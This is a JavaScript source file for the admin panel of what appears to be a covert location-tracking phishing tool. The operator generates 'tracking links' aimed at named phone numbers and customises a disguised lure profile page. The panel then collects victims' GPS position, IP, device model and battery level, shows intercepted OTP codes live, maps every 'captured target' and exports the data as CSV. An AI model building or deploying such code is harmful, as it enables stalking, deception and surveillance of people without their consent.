// Authorized Admin Dashboard Logic

let adminKey = sessionStorage.getItem('adminKey') || '';
let adminMap = null;
let mapMarkers = [];
let eventSource = null;
let cachedLocations = [];

// Elements
const authOverlay = document.getElementById('authOverlay');
const authKeyInput = document.getElementById('authKeyInput');
const authSubmitBtn = document.getElementById('authSubmitBtn');
const authError = document.getElementById('authError');
const logoutBtn = document.getElementById('logoutBtn');

const alertBanner = document.getElementById('alertBanner');
const alertBannerText = document.getElementById('alertBannerText');
const sseStatus = document.getElementById('sseStatus');

const targetTagInput = document.getElementById('targetTagInput');
const targetPhoneInput = document.getElementById('targetPhoneInput');
const generateLinkBtn = document.getElementById('generateLinkBtn');
const linkResultText = document.getElementById('linkResultText');
const copyLinkBtn = document.getElementById('copyLinkBtn');

const totalHits = document.getElementById('totalHits');
const uniqueIps = document.getElementById('uniqueIps');
const avgAccuracy = document.getElementById('avgAccuracy');
const dbCountBadge = document.getElementById('dbCountBadge');
const dbTableBody = document.getElementById('dbTableBody');
const refreshBtn = document.getElementById('refreshBtn');
const clearAllBtn = document.getElementById('clearAllBtn');
const exportCsvBtn = document.getElementById('exportCsvBtn');

// --------------------------------------------------------------------------
// Sound Alert (Web Audio Synthesizer)
// --------------------------------------------------------------------------
function playIntelAlertChime() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();

    osc.type = 'sine';
    osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
    osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.15); // A5

    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);

    osc.connect(gain);
    gain.connect(ctx.destination);

    osc.start();
    osc.stop(ctx.currentTime + 0.4);
  } catch (e) {
    console.warn('Audio chime blocked or unavailable:', e);
  }
}

// --------------------------------------------------------------------------
// Authentication Flow
// --------------------------------------------------------------------------
async function verifyAuth(key) {
  try {
    const res = await fetch('/api/admin/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key })
    });
    const data = await res.json();
    return data.success;
  } catch (e) {
    return false;
  }
}

async function handleLogin() {
  const enteredKey = authKeyInput.value.trim();
  if (!enteredKey) return;

  const valid = await verifyAuth(enteredKey);
  if (valid) {
    adminKey = enteredKey;
    sessionStorage.setItem('adminKey', adminKey);
    authOverlay.style.display = 'none';
    authError.style.display = 'none';
    initializeDashboard();
  } else {
    authError.style.display = 'block';
  }
}

authSubmitBtn.addEventListener('click', handleLogin);
authKeyInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') handleLogin();
});

function handleLogout() {
  // Clear all admin session credentials
  sessionStorage.removeItem('adminKey');
  localStorage.removeItem('adminKey');
  adminKey = '';
  if (eventSource) {
    eventSource.close();
    eventSource = null;
  }
  // Direct logout: immediately redirect to home page without asking anything
  window.location.href = '/';
}

if (logoutBtn) {
  logoutBtn.addEventListener('click', handleLogout);
}

// --------------------------------------------------------------------------
// Dashboard Initialization
// --------------------------------------------------------------------------
async function initializeDashboard() {
  initMap();
  updateLinkDisplay('Visitor_1');
  await loadDatabaseRecords();
  await loadAdminConfig();
  connectSSEStream();
}

// --------------------------------------------------------------------------
// Map Initialization
// --------------------------------------------------------------------------
function initMap() {
  if (!adminMap) {
    adminMap = L.map('adminMap').setView([20, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; OpenStreetMap &copy; CARTO',
      subdomains: 'abcd',
      maxZoom: 19
    }).addTo(adminMap);
  }
}

function plotTargetsOnMap(records) {
  if (!adminMap) return;

  // Clear existing markers
  mapMarkers.forEach(m => adminMap.removeLayer(m));
  mapMarkers = [];

  if (records.length === 0) {
    adminMap.setView([20, 0], 2);
    return;
  }

  const bounds = [];

  records.forEach((rec, idx) => {
    const isLatest = idx === 0;
    const pinColor = isLatest ? '#10b981' : '#06b6d4';

    const icon = L.divIcon({
      className: 'admin-marker',
      html: `<div style="
        width: 14px;
        height: 14px;
        background: ${pinColor};
        border: 2px solid #ffffff;
        border-radius: 50%;
        box-shadow: 0 0 10px ${pinColor};
      "></div>`,
      iconSize: [14, 14],
      iconAnchor: [7, 7]
    });

    const marker = L.marker([rec.latitude, rec.longitude], { icon }).addTo(adminMap);
    const phoneDisplay = rec.phoneNumber && rec.phoneNumber !== 'N/A' 
      ? `<br><b>Phone:</b> <a href="tel:${rec.phoneNumber}" style="color: #38bdf8;">${escapeHtml(rec.phoneNumber)}</a>` 
      : '';

    marker.bindPopup(`
      <div style="font-family: sans-serif; font-size: 0.85rem; line-height: 1.5;">
        <strong style="color: #06b6d4;">[${rec.tag}] Target #${rec.id}</strong>
        ${phoneDisplay}<br>
        <b>Lat:</b> ${rec.latitude.toFixed(5)}<br>
        <b>Lon:</b> ${rec.longitude.toFixed(5)}<br>
        <b>Accuracy:</b> ±${Math.round(rec.accuracy || 0)}m<br>
        <b>IP:</b> ${rec.clientIp}<br>
        <b>Time:</b> ${new Date(rec.createdAt || rec.clientTimestamp).toLocaleTimeString()}<br>
        <a href="https://www.google.com/maps?q=${rec.latitude},${rec.longitude}" target="_blank" style="color: #3b82f6;">Open in Google Maps &rarr;</a>
      </div>
    `);

    mapMarkers.push(marker);
    bounds.push([rec.latitude, rec.longitude]);
  });

  if (bounds.length > 0) {
    adminMap.fitBounds(bounds, { maxZoom: 14, padding: [40, 40] });
  }
}

// --------------------------------------------------------------------------
// Real-Time SSE Stream
// --------------------------------------------------------------------------
function connectSSEStream() {
  if (eventSource) eventSource.close();

  eventSource = new EventSource(`/api/admin/stream?adminKey=${encodeURIComponent(adminKey)}`);

  eventSource.onopen = () => {
    sseStatus.textContent = 'SSE Active &bull; Real-Time Listening';
    sseStatus.style.color = 'var(--accent-emerald)';
  };

  eventSource.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'NEW_LOCATION') {
        handleIncomingNewTarget(data.record);
      } else if (data.type === 'OTP_SENT') {
        playIntelAlertChime();
        alertBannerText.textContent = `📲 Real-Time OTP Sent to ${data.phoneNumber} | Code: [${data.code}]`;
        alertBanner.style.display = 'flex';
        setTimeout(() => { alertBanner.style.display = 'none'; }, 8000);
      } else if (data.type === 'OTP_VERIFIED') {
        alertBannerText.textContent = `✅ OTP Verified for ${data.phoneNumber}! Awaiting location...`;
        alertBanner.style.display = 'flex';
        setTimeout(() => { alertBanner.style.display = 'none'; }, 6000);
      } else if (data.type === 'RECORD_DELETED' || data.type === 'ALL_CLEARED') {
        loadDatabaseRecords();
      } else if (data.type === 'CONFIG_UPDATED') {
        loadAdminConfig();
      }
    } catch (e) {
      console.error('SSE parse error:', e);
    }
  };

  eventSource.onerror = () => {
    sseStatus.textContent = 'SSE Reconnecting...';
    sseStatus.style.color = 'var(--accent-rose)';
  };
}

function handleIncomingNewTarget(record) {
  // Play Audio Alert
  playIntelAlertChime();

  // Show Alert Banner
  alertBannerText.textContent = `🚨 Captured [${record.tag}] from IP ${record.clientIp} at ${new Date().toLocaleTimeString()}!`;
  alertBanner.style.display = 'flex';
  setTimeout(() => {
    alertBanner.style.display = 'none';
  }, 6000);

  // Add to cached list
  cachedLocations.unshift(record);
  renderTable(cachedLocations);
  updateMetrics(cachedLocations);
  plotTargetsOnMap(cachedLocations);

  // Pan map to new coordinate
  if (adminMap) {
    adminMap.flyTo([record.latitude, record.longitude], 15, { duration: 1.2 });
  }
}

// --------------------------------------------------------------------------
// Load SQLite Database Records
// --------------------------------------------------------------------------
async function loadDatabaseRecords() {
  try {
    const res = await fetch('/api/admin/locations', {
      headers: { 'x-admin-key': adminKey }
    });
    const data = await res.json();
    if (data.success) {
      cachedLocations = data.locations;
      renderTable(cachedLocations);
      updateMetrics(cachedLocations);
      plotTargetsOnMap(cachedLocations);
    }
  } catch (e) {
    console.error('Failed to load DB:', e);
  }
}

// --------------------------------------------------------------------------
// Render Table & Metrics
// --------------------------------------------------------------------------
function renderTable(locations) {
  dbCountBadge.textContent = `${locations.length} records in SQLite`;

  if (locations.length === 0) {
    dbTableBody.innerHTML = `
      <tr>
        <td colspan="9" style="text-align: center; color: var(--text-dim); padding: 2rem;">
          No targets captured yet. Send a tracking link to begin.
        </td>
      </tr>
    `;
    return;
  }

  dbTableBody.innerHTML = locations.map(item => {
    const date = new Date(item.createdAt || item.clientTimestamp).toLocaleDateString([], { month: 'short', day: 'numeric' });
    const time = new Date(item.createdAt || item.clientTimestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const lat = Number(item.latitude).toFixed(5);
    const lon = Number(item.longitude).toFixed(5);
    const acc = item.accuracy ? `±${Math.round(item.accuracy)}m` : 'N/A';

    // Parse user agent & exact device model
    const ua = item.userAgent || '';
    let os = 'Desktop';
    if (/android/i.test(ua)) os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
    else if (/windows/i.test(ua)) os = 'Windows';
    else if (/macintosh|mac os x/i.test(ua)) os = 'Mac';
    else if (/linux/i.test(ua)) os = 'Linux';

    let browser = 'Browser';
    if (/chrome|crios/i.test(ua)) browser = 'Chrome';
    else if (/safari/i.test(ua)) browser = 'Safari';
    else if (/firefox/i.test(ua)) browser = 'Firefox';
    else if (/edg/i.test(ua)) browser = 'Edge';

    const deviceModelName = item.deviceModel && item.deviceModel !== 'Unknown Device'
      ? item.deviceModel
      : (os === 'Android' ? 'Android Device' : (os === 'iOS' ? 'Apple iPhone' : os));

    const phone = item.phoneNumber && item.phoneNumber !== 'N/A'
      ? `<div style="display: flex; flex-direction: column; gap: 2px;">
           <a href="https://wa.me/${item.phoneNumber.replace(/[^0-9]/g, '')}" target="_blank" style="color: #10b981; text-decoration: none; font-weight: 600;" title="WhatsApp / Call">
             ${escapeHtml(item.phoneNumber)} 💬
           </a>
           <span style="font-size: 0.68rem; color: #34d399; font-weight: 600;">✓ OTP VERIFIED</span>
         </div>`
      : `<span style="color: var(--text-dim);">N/A</span>`;

    return `
      <tr>
        <td style="color: var(--text-dim);">#${item.id}</td>
        <td><span class="tag-badge">${escapeHtml(item.tag || 'General')}</span></td>
        <td>${phone}</td>
        <td>
          <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn-map-link">
            ${lat}, ${lon} ↗
          </a>
        </td>
        <td style="color: var(--accent-cyan);">${acc}</td>
        <td>${escapeHtml(item.clientIp)}</td>
        <td>
          <div style="display: flex; flex-direction: column; gap: 2px;">
            <span style="color: #fff; font-weight: 600; font-size: 0.85rem;">📱 ${escapeHtml(deviceModelName)}</span>
            <span style="color: var(--text-dim); font-size: 0.73rem;">${os} &bull; ${browser}</span>
          </div>
        </td>
        <td style="color: var(--text-dim); font-size: 0.75rem;">${escapeHtml(item.batteryLevel || 'N/A')} &bull; ${escapeHtml(item.screenResolution || 'N/A')}</td>
        <td>${date} <span style="color: var(--text-dim);">${time}</span></td>
        <td>
          <button type="button" class="btn-action" onclick="deleteRecord(${item.id})">Delete</button>
        </td>
      </tr>
    `;
  }).join('');
}

function updateMetrics(locations) {
  totalHits.textContent = locations.length;
  const uniqueIpSet = new Set(locations.map(l => l.clientIp));
  uniqueIps.textContent = uniqueIpSet.size;

  if (locations.length > 0) {
    const accuracies = locations.filter(l => l.accuracy).map(l => Number(l.accuracy));
    if (accuracies.length > 0) {
      const avg = Math.round(accuracies.reduce((a, b) => a + b, 0) / accuracies.length);
      avgAccuracy.textContent = `±${avg}m`;
    } else {
      avgAccuracy.textContent = '--';
    }
  } else {
    avgAccuracy.textContent = '--';
  }
}

// --------------------------------------------------------------------------
// Actions (Delete, Clear, Export)
// --------------------------------------------------------------------------
window.deleteRecord = async function (id) {
  if (!confirm(`Delete record #${id}?`)) return;
  try {
    await fetch(`/api/admin/locations/${id}`, {
      method: 'DELETE',
      headers: { 'x-admin-key': adminKey }
    });
    loadDatabaseRecords();
  } catch (e) {
    alert('Failed to delete');
  }
};

clearAllBtn.addEventListener('click', async () => {
  if (!confirm('Are you sure you want to CLEAR the entire database? This cannot be undone.')) return;
  try {
    await fetch('/api/admin/locations', {
      method: 'DELETE',
      headers: { 'x-admin-key': adminKey }
    });
    loadDatabaseRecords();
  } catch (e) {
    alert('Failed to clear database');
  }
});

exportCsvBtn.addEventListener('click', () => {
  if (cachedLocations.length === 0) {
    alert('No records to export');
    return;
  }

  const headers = ['ID', 'Tag', 'PhoneNumber', 'DeviceModel', 'Latitude', 'Longitude', 'Accuracy', 'IP', 'UserAgent', 'Screen', 'Battery', 'Timestamp'];
  const rows = cachedLocations.map(l => [
    l.id,
    `"${(l.tag || '').replace(/"/g, '""')}"`,
    `"${(l.phoneNumber || 'N/A').replace(/"/g, '""')}"`,
    `"${(l.deviceModel || 'N/A').replace(/"/g, '""')}"`,
    l.latitude,
    l.longitude,
    l.accuracy || '',
    l.clientIp || '',
    `"${(l.userAgent || '').replace(/"/g, '""')}"`,
    l.screenResolution || '',
    l.batteryLevel || '',
    l.createdAt || l.clientTimestamp
  ]);

  const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement('a');
  link.setAttribute('href', encodedUri);
  link.setAttribute('download', `tracking_database_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
});

refreshBtn.addEventListener('click', loadDatabaseRecords);

// --------------------------------------------------------------------------
// Tracking Link Generator
// --------------------------------------------------------------------------
function updateLinkDisplay(tag, phone = '') {
  const origin = window.location.origin;
  let link = `${origin}/?tag=${encodeURIComponent(tag)}`;
  if (phone) {
    link += `&phone=${encodeURIComponent(phone)}`;
  }
  linkResultText.textContent = link;
}

generateLinkBtn.addEventListener('click', () => {
  const tag = targetTagInput.value.trim() || 'Visitor_' + Math.floor(Math.random() * 1000);
  const phone = targetPhoneInput ? targetPhoneInput.value.trim() : '';
  updateLinkDisplay(tag, phone);
});

copyLinkBtn.addEventListener('click', () => {
  navigator.clipboard.writeText(linkResultText.textContent);
  copyLinkBtn.textContent = 'Copied!';
  setTimeout(() => { copyLinkBtn.textContent = 'Copy Link'; }, 2000);
});

// --------------------------------------------------------------------------
// Live Frontend UI Customizer Logic (Full Control Access)
// --------------------------------------------------------------------------
const configForm = document.getElementById('configForm');
const cfgName = document.getElementById('cfgName');
const cfgTitle = document.getElementById('cfgTitle');
const cfgBio = document.getElementById('cfgBio');
const cfgPageTitle = document.getElementById('cfgPageTitle');
const cfgButtonText = document.getElementById('cfgButtonText');
const cfgImgUrl = document.getElementById('cfgImgUrl');
const cfgDefaultCountry = document.getElementById('cfgDefaultCountry');
const cfgRequirePhone = document.getElementById('cfgRequirePhone');
const cfgRequireOtp = document.getElementById('cfgRequireOtp');
const cfgThemeColor = document.getElementById('cfgThemeColor');
const configSaveStatus = document.getElementById('configSaveStatus');
const adminDpPreview = document.getElementById('adminDpPreview');
const dpFileInput = document.getElementById('dpFileInput');
const triggerUploadBtn = document.getElementById('triggerUploadBtn');
const dpUploadStatus = document.getElementById('dpUploadStatus');

// Update preview when manual URL input changes
if (cfgImgUrl && adminDpPreview) {
  cfgImgUrl.addEventListener('input', () => {
    const val = cfgImgUrl.value.trim();
    if (val) {
      adminDpPreview.src = val;
    }
  });
}

// Wire DP File Upload button and input
if (triggerUploadBtn && dpFileInput) {
  triggerUploadBtn.addEventListener('click', () => {
    dpFileInput.click();
  });

  dpFileInput.addEventListener('change', async (e) => {
    const file = e.target.files && e.target.files[0];
    if (!file) return;

    if (!file.type.startsWith('image/')) {
      alert('Please select a valid image file (JPG, PNG, WEBP, GIF).');
      return;
    }

    // Limit check (15MB)
    if (file.size > 15 * 1024 * 1024) {
      alert('Image file is too large! Please choose an image under 15MB.');
      return;
    }

    dpUploadStatus.textContent = '⏳ Uploading & saving photo...';
    dpUploadStatus.style.color = 'var(--accent-cyan)';
    triggerUploadBtn.disabled = true;

    try {
      const reader = new FileReader();
      reader.onload = async () => {
        const base64Data = reader.result;

        // Immediately show local preview
        if (adminDpPreview) {
          adminDpPreview.src = base64Data;
        }

        const res = await fetch('/api/admin/upload-dp', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-admin-key': adminKey
          },
          body: JSON.stringify({
            imageData: base64Data,
            filename: file.name
          })
        });

        const data = await res.json();
        if (!res.ok || !data.success) {
          throw new Error(data.error || 'Upload failed');
        }

        // Success: update form field and server URL preview
        if (cfgImgUrl) cfgImgUrl.value = data.imageUrl;
        if (adminDpPreview) adminDpPreview.src = data.imageUrl;

        dpUploadStatus.textContent = '✅ Profile picture updated successfully!';
        dpUploadStatus.style.color = 'var(--accent-emerald)';

        // Show top alert banner as well
        alertBannerText.textContent = '📸 Profile Picture (DP) uploaded & updated on frontend!';
        alertBanner.style.display = 'flex';
        setTimeout(() => { alertBanner.style.display = 'none'; }, 5000);
      };

      reader.readAsDataURL(file);
    } catch (err) {
      console.error('DP upload error:', err);
      dpUploadStatus.textContent = '❌ Upload failed: ' + err.message;
      dpUploadStatus.style.color = 'var(--accent-rose)';
      alert('Failed to upload profile picture: ' + err.message);
    } finally {
      triggerUploadBtn.disabled = false;
      dpFileInput.value = '';
    }
  });
}

async function loadAdminConfig() {
  try {
    const res = await fetch('/api/config');
    const data = await res.json();
    if (data.success && data.config) {
      const c = data.config;
      if (cfgName) cfgName.value = c.profileName || '';
      if (cfgTitle) cfgTitle.value = c.profileTitle || '';
      if (cfgBio) cfgBio.value = c.profileBio || '';
      if (cfgPageTitle) cfgPageTitle.value = c.pageTitle || '';
      if (cfgButtonText) cfgButtonText.value = c.buttonText || '';
      if (cfgImgUrl) cfgImgUrl.value = c.profileImgUrl || '';
      if (adminDpPreview && c.profileImgUrl) adminDpPreview.src = c.profileImgUrl;
      if (cfgDefaultCountry && c.defaultCountry) cfgDefaultCountry.value = c.defaultCountry;
      if (cfgRequirePhone) cfgRequirePhone.checked = c.requirePhone !== false;
      if (cfgRequireOtp) cfgRequireOtp.checked = c.requireOtp !== false;
      if (cfgThemeColor) cfgThemeColor.value = c.themeColor || '#06b6d4';
    }
  } catch (e) {
    console.error('Failed to load config:', e);
  }
}

if (configForm) {
  configForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const payload = {
      profileName: cfgName.value.trim(),
      profileTitle: cfgTitle.value.trim(),
      profileBio: cfgBio.value.trim(),
      pageTitle: cfgPageTitle.value.trim(),
      buttonText: cfgButtonText.value.trim(),
      profileImgUrl: cfgImgUrl.value.trim() || 'profile.jpg',
      defaultCountry: cfgDefaultCountry.value,
      requirePhone: cfgRequirePhone.checked,
      requireOtp: cfgRequireOtp.checked,
      themeColor: cfgThemeColor.value
    };

    const saveBtn = document.getElementById('saveConfigBtn');
    saveBtn.disabled = true;
    saveBtn.innerHTML = `<span>Saving...</span>`;

    try {
      const res = await fetch('/api/admin/config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify(payload)
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || 'Failed to save configuration');
      }

      if (adminDpPreview && payload.profileImgUrl) {
        adminDpPreview.src = payload.profileImgUrl;
      }

      configSaveStatus.style.display = 'inline-block';
      configSaveStatus.textContent = '✓ Saved & Applied to Frontend!';
      setTimeout(() => {
        configSaveStatus.style.display = 'none';
      }, 4000);

    } catch (err) {
      alert('Error saving settings: ' + err.message);
    } finally {
      saveBtn.disabled = false;
      saveBtn.innerHTML = `💾 Save &amp; Apply Changes Live`;
    }
  });
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// --------------------------------------------------------------------------
// Auto-login if session exists
// --------------------------------------------------------------------------
document.addEventListener('DOMContentLoaded', async () => {
  if (adminKey) {
    const valid = await verifyAuth(adminKey);
    if (valid) {
      authOverlay.style.display = 'none';
      initializeDashboard();
      return;
    }
  }
  authOverlay.style.display = 'flex';
});
